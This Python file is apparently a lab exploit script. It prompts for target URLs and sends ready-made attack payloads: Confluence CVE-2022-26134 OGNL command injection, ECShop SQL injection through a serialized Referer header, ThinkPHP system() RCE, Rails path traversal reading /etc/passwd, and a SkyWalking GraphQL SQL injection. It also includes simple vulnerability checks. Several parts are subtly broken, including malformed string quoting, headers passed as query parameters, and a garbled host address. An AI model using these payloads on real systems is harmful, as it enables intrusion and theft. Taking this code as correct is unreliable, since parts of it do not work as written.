from typing import Type
from wsgiref import headers
import requests

def exploit_confluence_CVE_2022_26134():
    url1 = input('write url\n')
    url1 += "{(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(" + "id"").getInputStream()," + "utf-8"")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(" + "X-Cmd-Response"",#a))}/"
    headers1 = { "HOST":"192.168.56.101:8090", 
                "Accept-Encoding":"gzip, deflate",
                "Accept":"*/*",
                "Accept-Language":"en",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
                "Connection":"close"}
    res1 = requests.get(url1, headers1)
    print(res1.headers)

def check_confluence_CVE_2022_26134():
    url1 = input('write url\n')
    res1 = requests.post(url1)
    if(res1.headers['x-confluence-request-time'] != 0):
        print('Code injection can be used')
        return True
    else:
        print('lol')

def exploit_ecshop():
    url1 = input('write url\n') + "/user.php?act=login"
    headers1 = {"Host":"192.168.56.101",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                "Cookie":"PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1",
                "Referer":"45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:" + "num"+";s:107:"+"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -"+";s:2:"+"id"+";s:11:"+"-1' UNION/*"+ ";}45ea207d7a2b68c49582d2d22adf953a",
                "Connection":"close",
                "Upgrade-Insecure-Requests":"1",
                "Cache-Control": "max-age=0"}
 
    res1 = requests.get(url1, headers1)
    print(res1.headers)
    if (res1.status_code == 200):
        print("vulnirability was abused")
    else:
        print("something went wrong")

def check_ecshop():
    url1 = input('write url\n') + "/user.php?act=login"
    headers1 = {"Host":"192.168.56.101",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                "Cookie":"PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1",
                "Referer":"45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:" + "num"+";s:107:"+"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -"+";s:2:"+"id"+";s:11:"+"-1' UNION/*"+ ";}45ea207d7a2b68c49582d2d22adf953a",
                "Connection":"close",
                "Upgrade-Insecure-Requests":"1",
                "Cache-Control": "max-age=0"}
 
    res1 = requests.get(url1, headers1)
    my_str = res1.headers['Set-Cookie'][:3]
    if (my_str == "ECS"):
        print("SQLi can be used")

def thinkphp_exploit_RCE():
    url1 = input('write url\n') 
    url1 += "/index.php?s=captcha"
    my_heads = {"Host":"localhost",
                "Accept-Encoding":"gzip, deflate",
                "Accept":"*/*",
                "Accept-Language":"en",
                "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
                "Connection":"close",
                "Content-Type":"application/x-www-form-urlencoded",
                "Content-Length":"72"}
    my_params = {"_method":"_construct",
               "filter[]":"system",
               "method":"get",
               "server[REQUEST_METHOD]":"id"}
    req = requests.post(url1, my_params, my_heads)
    print(req.text)

    

def chech_thinkphp():
    url1 = input('write url\n')
    req = requests.get(url1)
    my_str = ""
    i = req.text.find('[') + 3
    my_str = req.text[i: i+5]
    print("Current version: ", my_str)
    if int(my_str[0]) <= 5 and int(my_str[2]) <= 0:
        print("RCE vulnerability found")

   
def exploit_Rails():
    url1 = input('write url\n') + "/robots"
    headers1 = {"Host":"192.168..56.101:3000",
                "Accept-Encoding":"gzip, deflate",
                "Accept":"../../../../../../../../etc/passwd{{",
                "Accept-Language":"en",
                "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
                "Connection":"close"}
    req = requests.get(url1, headers1)
    print(req.text)

def exploit_SKYWALKING():
    url1 = input('write url\n') + "/graphql"
    headers1 = {"Host":"localhost:8080",
                "Accept-Encoding": "gzip, deflate",
                "Accept": "*/*",
                "Accept-Language": "en",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Connection":"close",
                "Content-Type": "application/json",
                "Content-Length": "336"}
    my_params = '{"query":"query queryLogs($condition: LogQueryCondition) { queryLogs(condition: $condition) {total logs {serviceId serviceName isError content } }}","variables":{"condition":{"metricName":"sqli","state":"ALL", "paging":{"pageSize":10}}}}'
    req = requests.post(url1, headers1, my_params)
    print(req.text)

def check_SKYWALKING():
    url1 = input('write url\n')
    res1 = requests.get (url1)
    print(res1.headers)

def main():
    chech_thinkphp()
    thinkphp_exploit_RCE()
    exploit_ecshop()
    check_ecshop()
    check_confluence_CVE_2022_26134()
    exploit_confluence_CVE_2022_26134()
    exploit_SKYWALKING()
    exploit_SKYWALKING()
    check_SKYWALKING()

if __name__ == "__main__":
    main()    

